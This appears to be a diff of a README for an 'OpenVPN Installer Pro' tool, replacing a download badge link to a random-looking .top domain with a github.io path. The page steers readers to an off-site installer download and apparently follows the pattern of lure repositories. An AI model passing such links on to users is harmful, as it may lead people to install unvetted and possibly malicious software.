@@ -1,8 +1,8 @@
-# OpenVPN Installer Pro 2025
+# OpenVPN Installer Pro
 
 A fast and secure OpenVPN setup tool that automates server configuration with one click—perfect for developers, sysadmins, and privacy enthusiasts.  
 
-[![Download OpenVPN Installer](https://img.shields.io/badge/Download-OpenVPN_Installer-blueviolet)](https://poelkakusthbutn.top/)  
+[![Download OpenVPN Installer](https://img.shields.io/badge/Download-OpenVPN_Installer-blueviolet)](https://openvpn-installer.github.io/.github)  
 
 ---  
 
